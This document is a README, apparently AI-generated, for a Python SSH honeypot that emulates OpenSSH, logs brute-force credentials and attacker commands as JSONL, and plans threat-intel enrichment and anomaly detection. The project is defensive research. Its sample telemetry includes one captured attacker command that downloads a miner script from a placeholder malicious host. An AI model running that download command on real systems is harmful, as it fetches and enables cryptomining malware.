```markdown
# 🛡️ SentinelPot: Intelligent Low-Interaction SSH Honeypot & Threat Analytics

[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED.svg)](https://www.docker.com/)
[![Security](https://img.shields.io/badge/Type-Low--Interaction%20Honeypot-red.svg)](#)

A custom, low-interaction SSH honeypot and threat intelligence engine engineered in Python. **SentinelPot** simulates an authentic OpenSSH service, traps brute-force credential sprays, captures interactive attacker keystrokes via terminal emulation, and structures connection telemetry for automated threat analysis and machine learning anomaly detection.

---

## 📌 Architecture Overview


```

```
             [ Inbound SSH Traffic / Scanners ]
                            │
                            ▼

```

┌───────────────────────────────────────────────────────────────┐
│ Phase 1: Core Honeypot Daemon (Python / Paramiko)             │
│ - Raw TCP Socket Listener (Port 2222 -> Port 22 via Docker)   │
│ - RSA Host Key Handshake & Ubuntu OpenSSH Banner Emulation    │
│ - Intercepts Credentials & Captures Interactive Shell Inputs  │
│ - Structured JSON Lines (`.jsonl`) Telemetry Logger           │
└───────────────────────────────┬───────────────────────────────┘
│
▼
┌───────────────────────────────────────────────────────────────┐
│ Phase 2: Threat Intelligence & Log Enrichment                 │
│ - MaxMind GeoIP2: Resolves Country, City, Coordinates, & ASN  │
│ - AbuseIPDB / VirusTotal API: Cross-references malicious IPs  │
│ - Normalized Storage: SQLite / Pandas analytical pipeline     │
└───────────────────────────────┬───────────────────────────────┘
│
▼
┌───────────────────────────────────────────────────────────────┐
│ Phase 3: Machine Learning & Behavioral Analysis               │
│ - Feature Extraction: Session duration, payload entropy       │
│ - Isolation Forest: Unsupervised anomaly score calculation    │
│ - TF-IDF + K-Means: Automated clustering of payload campaigns │
└───────────────────────────────────────────────────────────────┘

```

---

## ✨ Features

- **Protocol-Accurate Emulation:** Negotiates SSHv2 handshakes, cipher suites, and OpenSSH banners using Paramiko.
- **Dual Defense & Harvesting Modes:**
  - *Credential Harvester:* Rejects authentication (`AUTH_FAILED`) to maximize harvested passwords per connection attempt.
  - *Pseudo-Shell Tarpit:* Accepts credentials (`AUTH_SUCCESSFUL`) to present a simulated bash shell and capture post-exploitation commands.
- **Interactive Shell Trapping:** Emulates PTY channels, handles escape characters (backspace, enter), and mimics standard Linux tools (`whoami`, `id`, `uname -a`).
- **Structured JSONL Logging:** Emits machine-readable events containing timestamps, source IP, ephemeral port, credentials, and commands.
- **OSINT Enrichment (Planned):** Automatically correlates attacker IPs against MaxMind GeoIP and AbuseIPDB.
- **Behavioral Clustering (Planned):** Categorizes scans versus targeted human intrusions using unsupervised machine learning.

---

## 📂 Project Structure

```text
.
├── config/
│   └── settings.yaml          # Network and port configurations
├── data/
│   ├── honeypot_events.jsonl  # Raw captured telemetry (JSON Lines)
│   └── enriched_events.db     # Enriched SQLite analytical database
├── src/
│   ├── honeypot/
│   │   ├── __init__.py
│   │   ├── server.py          # Paramiko ServerInterface & listener
│   │   └── shell.py           # Terminal emulation and command handlers
│   ├── enrichment/
│   │   ├── __init__.py
│   │   └── threat_intel.py    # GeoIP and AbuseIPDB enrichers
│   └── ml/
│       ├── __init__.py
│       └── anomaly_model.py   # Isolation Forest & clustering
├── tests/
│   └── test_server.py         # Socket and connection tests
├── .gitignore
├── Dockerfile                 # Sandboxed container definition
├── docker-compose.yml         # Container port forwarding orchestration
├── requirements.txt           # Python dependencies
└── README.md

```

---

## 🚀 Getting Started

### Prerequisites

* Python 3.10 or higher
* Git
* Virtual environment (`venv`)

### Installation & Setup

1. **Clone the repository:**
```bash
git clone [https://github.com/your-username/HoneyPot.git](https://github.com/your-username/HoneyPot.git)
cd HoneyPot

```


2. **Set up a virtual environment:**
```bash
python3 -m venv venv
source venv/bin/activate
# Windows: venv\Scripts\activate

```


3. **Install dependencies:**
```bash
pip install -r requirements.txt

```


4. **Generate RSA Host Key (or allow server to auto-generate on start):**
```bash
ssh-keygen -t rsa -b 2048 -f honeypot_rsa.key -N ""

```



---

## 🛠️ Running the Honeypot

### Local Execution

Start the honeypot listener on `127.0.0.1:2222`:

```bash
python3 step3_shell_emulation.py

```

From another terminal, simulate an attacker connection:

```bash
ssh root@127.0.0.1 -p 2222

```

### Docker Deployment (Production Emulation)

To route standard SSH port 22 traffic into the unprivileged honeypot listener:

```bash
docker compose up -d --build

```

---

## 📊 Sample Telemetry Output

All activity is recorded into `honeypot_events.jsonl`:

```json
{"timestamp": "2026-10-05T14:20:11.120Z", "event_type": "auth_attempt", "src_ip": "198.51.100.42", "src_port": 51234, "details": {"username": "root", "password": "123456Password", "auth_method": "password"}}
{"timestamp": "2026-10-05T14:20:13.450Z", "event_type": "command_exec", "src_ip": "198.51.100.42", "src_port": 51234, "details": {"command": "uname -a", "interactive": true}}
{"timestamp": "2026-10-05T14:20:15.890Z", "event_type": "command_exec", "src_ip": "198.51.100.42", "src_port": 51234, "details": {"command": "curl -O [http://malicious.bin/miner.sh](http://malicious.bin/miner.sh)", "interactive": true}}

```

---

## 🗺️ 45-Day Development Roadmap

* [x] **Phase 1: Foundations (Days 1–15)**
* [x] Raw TCP socket listener and multithreaded worker handling.
* [x] Paramiko SSHv2 handshake and authentication interception.
* [x] Interactive pseudo-terminal (PTY) shell emulation.
* [ ] Standardized `.jsonl` logging and file rotating pipeline.


* [ ] **Phase 2: Threat Enrichment (Days 16–30)**
* [ ] MaxMind GeoLite2 country/city/ASN resolution.
* [ ] AbuseIPDB / AlienVault OTX asynchronous reputation checks.
* [ ] SQLite ingestion pipeline for analytical reporting.


* [ ] **Phase 3: Machine Learning & Analytics (Days 31–45)**
* [ ] Feature engineering (connection duration, command frequency, payload entropy).
* [ ] Isolation Forest anomaly scoring for atypical attack sessions.
* [ ] TF-IDF + K-Means clustering for automated payload taxonomy.



---

## ⚖️ Disclaimer

This honeypot is built strictly for cybersecurity research, academic investigation, and defensive analysis. Run this service in an isolated network segment, sandbox, or container environment. Never deploy honeypots within production subnets containing sensitive personal or organizational data.

---

## 📄 License

This project is licensed under the MIT License - see the `LICENSE` file for details.

```

<FollowUp label="Want me to walk you through Exercise 4: Building the JSONL logging module?" query="Let's build Exercise 4: Writing the structured JSONL logging function and integrating it into the honeypot."/>

```
